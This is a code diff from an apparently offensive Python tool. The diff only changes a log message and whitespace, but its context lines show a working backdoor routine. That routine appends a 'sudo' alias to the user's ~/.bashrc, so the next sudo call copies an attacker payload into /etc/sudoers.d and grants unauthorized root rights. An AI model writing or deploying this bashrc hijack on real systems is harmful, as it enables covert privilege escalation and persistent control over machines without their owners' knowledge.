@@ -71,7 +71,7 @@ def backdoor_rc(payload, sudofile):
     backdoor_line = 'alias sudo=\"\sudo cp {} /etc/sudoers.d/{} 2>&1; \sudo"'.format(payload, sudofile)
     home = os.path.expanduser("~")
     bashrc = "{}/.bashrc".format(home)
-    print("Backdooring {}".format(bashrc))
+    print("Backdooring :)")
     try:
         with open(bashrc,'a') as f:
             f.write(backdoor_line)
@@ -117,7 +117,7 @@ def main(args):
     
     if not os.path.isfile(args.payload):
         gen_break_ticket_payload(args.payload)
-    
+
     # backdoor the rc file of the current user so the next 
     # time they run sudo 
     if args.b:  
